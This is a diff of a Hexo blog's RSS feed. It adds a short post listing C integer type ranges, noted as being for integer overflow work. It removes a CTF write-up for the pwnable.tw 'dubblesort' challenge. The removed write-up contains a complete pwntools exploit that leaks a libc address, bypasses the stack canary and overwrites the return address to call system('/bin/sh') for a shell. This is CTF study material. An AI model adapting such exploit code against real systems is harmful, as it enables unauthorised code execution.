@@ -9,8 +9,27 @@
     <atom:link href="http://example.com/rss2.xml" rel="self" type="application/rss+xml"/>
     
     <description>柴柴就是世界第一可爱！！!</description>
-    <pubDate>Tue, 16 Apr 2024 14:13:34 GMT</pubDate>
+    <pubDate>Fri, 26 Apr 2024 15:25:11 GMT</pubDate>
     <generator>http://hexo.io/</generator>
+    
+    <item>
+      <title>整数类型取值范围</title>
+      <link>http://example.com/2024/04/26/%E6%95%B4%E6%95%B0%E7%B1%BB%E5%9E%8B%E5%8F%96%E5%80%BC%E8%8C%83%E5%9B%B4/</link>
+      <guid>http://example.com/2024/04/26/%E6%95%B4%E6%95%B0%E7%B1%BB%E5%9E%8B%E5%8F%96%E5%80%BC%E8%8C%83%E5%9B%B4/</guid>
+      <pubDate>Fri, 26 Apr 2024 14:57:03 GMT</pubDate>
+      
+      <description>&lt;p&gt;用于整数溢出&lt;/p&gt;</description>
+      
+      
+      
+      <content:encoded><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>用于整数溢出</p><span id="more"></span><table><thead><tr><th>type</th><th>min</th><th>max</th><th>hex</th></tr></thead><tbody><tr><td>int</td><td>-2147483648</td><td>2147483647 (2^31 - 1)</td><td>0x7FFFFFFF</td></tr><tr><td>unsigned int</td><td>0</td><td>4294967295 (2^32 - 1)</td><td>0xFFFFFFFF</td></tr><tr><td>long</td><td>-2147483648</td><td>2147483647 (2^31 - 1)</td><td>0x7FFFFFFF</td></tr><tr><td>unsigned long</td><td>0</td><td>4294967295 (2^32 - 1)</td><td>0xFFFFFFFF</td></tr><tr><td>long long</td><td>-9223372036854775808</td><td>9223372036854775807 (2^63 - 1)</td><td>0x7FFFFFFFFFFFFFFF</td></tr><tr><td>unsigned long long</td><td>0</td><td>18446744073709551615 (2^64 - 1)</td><td>0xFFFFFFFFFFFFFFFF</td></tr><tr><td>__int8</td><td>-128</td><td>127</td><td>0x7F</td></tr><tr><td>unsigned __int8</td><td>0</td><td>255</td><td>0xFF</td></tr><tr><td>__int16</td><td>-32768</td><td>32767</td><td>0x7FFF</td></tr><tr><td>unsigned __int16</td><td>0</td><td>65535</td><td>0xFFFF</td></tr><tr><td>__int32</td><td>-2147483648</td><td>2147483647</td><td>0x7FFFFFFF</td></tr><tr><td>unsigned __int32</td><td>0</td><td>4294967295</td><td>0xFFFFFFFF</td></tr><tr><td>__int64</td><td>-9223372036854775808</td><td>9223372036854775807 (2^63 - 1)</td><td>0x7FFFFFFFFFFFFFFF</td></tr><tr><td>unsigned __int64</td><td>0</td><td>18446744073709551615 (2^64 - 1)</td><td>0xFFFFFFFFFFFFFFFF</td></tr></tbody></table>]]></content:encoded>
+      
+      
+      
+      
+      <comments>http://example.com/2024/04/26/%E6%95%B4%E6%95%B0%E7%B1%BB%E5%9E%8B%E5%8F%96%E5%80%BC%E8%8C%83%E5%9B%B4/#disqus_thread</comments>
+      
+    </item>
     
     <item>
       <title>Re Go Go Go!</title>
@@ -180,25 +199,6 @@
       
       
       <comments>http://example.com/2024/01/26/pwnable-3x17/#disqus_thread</comments>
-      
-    </item>
-    
-    <item>
-      <title>pwnable-dubblesort</title>
-      <link>http://example.com/2024/01/25/pwnable-dubblesort/</link>
-      <guid>http://example.com/2024/01/25/pwnable-dubblesort/</guid>
-      <pubDate>Thu, 25 Jan 2024 14:19:54 GMT</pubDate>
-      
-      <description>&lt;p&gt;连接题目后，发现输入字符后会带出一些不可见字符，再分析源码，是因为程序没有将缓冲区清空导致的，所以栈内可能会存在一些有用的数据&lt;/p&gt;</description>
-      
-      
-      
-      <content:encoded><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>连接题目后，发现输入字符后会带出一些不可见字符，再分析源码，是因为程序没有将缓冲区清空导致的，所以栈内可能会存在一些有用的数据</p><span id="more"></span><p><img src="/imgs/$%7Bfiilename%7D/pwnable-dubblesort-3.png"></p><p>经过调试，发现栈内存在libc中的地址</p><p><img src="/imgs/$%7Bfiilename%7D/pwnable-dubblesort-1.png" alt="pwnable-dubblesort-1"></p><p>偏移为 0x1b0000</p><p><img src="/imgs/$%7Bfiilename%7D/pwnable-dubblesort-2.png" alt="pwnable-dubblesort-2"></p><p>带出libc基址后就是ret2libc了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> pack</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ae64 <span class="keyword">import</span> AE64</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">debug = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    p = process(<span class="string">&#x27;/home/feichai/ctf_file/dubblesort&#x27;</span>,env=&#123;<span class="string">&quot;LD_PRELOAD&quot;</span>:<span class="string">&quot;./libc_32.so.6&quot;</span>&#125;)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">&#x27;chall.pwnable.tw&#x27;</span>, <span class="number">10101</span>)</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&quot;i386&quot;</span>,os=<span class="string">&quot;linux&quot;</span>,log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line">elf=ELF(<span class="string">&quot;/home/feichai/ctf_file/dubblesort&quot;</span>)</span><br><span class="line">libc=ELF(<span class="string">&quot;/home/feichai/ctf_file/libc_32.so.6&quot;</span>)</span><br><span class="line">libcc=cdll.LoadLibrary(<span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line">offset = <span class="number">0x001b0000</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pwn</span>():</span><br><span class="line">    </span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;What your name :&#x27;</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">4</span>*<span class="number">7</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;a&#x27;</span>*<span class="number">28</span>)</span><br><span class="line">    libc_base = u32(p.recv(<span class="number">4</span>))- offset -<span class="number">0xa</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;libc_base:&quot;</span>,<span class="built_in">hex</span>(libc_base))</span><br><span class="line">    system =libc_base + libc.symbols[<span class="string">b&#x27;system&#x27;</span>]</span><br><span class="line">    bin_sh = libc_base + <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>))</span><br><span class="line"></span><br><span class="line">    length = <span class="number">24</span>+<span class="number">1</span>+<span class="number">9</span>+<span class="number">1</span></span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;to sort :&#x27;</span>,<span class="built_in">str</span>(length))</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">24</span>):</span><br><span class="line">        p.sendlineafter(<span class="string">b&#x27;number : &#x27;</span>,<span class="string">b&#x27;0&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;number : &#x27;</span>,<span class="string">b&#x27;+&#x27;</span>) <span class="comment"># &#x27;+&#x27;不会改变栈上的数据,可以用来绕过canary</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>):</span><br><span class="line">        p.sendlineafter(<span class="string">b&#x27;number : &#x27;</span>,<span class="built_in">str</span>(system)) <span class="comment"># 将canary后到返回地址都填充为system避免因为排序导致顺序被打乱</span></span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;number : &#x27;</span>,<span class="built_in">str</span>(bin_sh))</span><br><span class="line"></span><br><span class="line">    p.interactive() </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    pwn()</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content:encoded>
-      
-      
-      
-      
-      <comments>http://example.com/2024/01/25/pwnable-dubblesort/#disqus_thread</comments>
       
     </item>
     
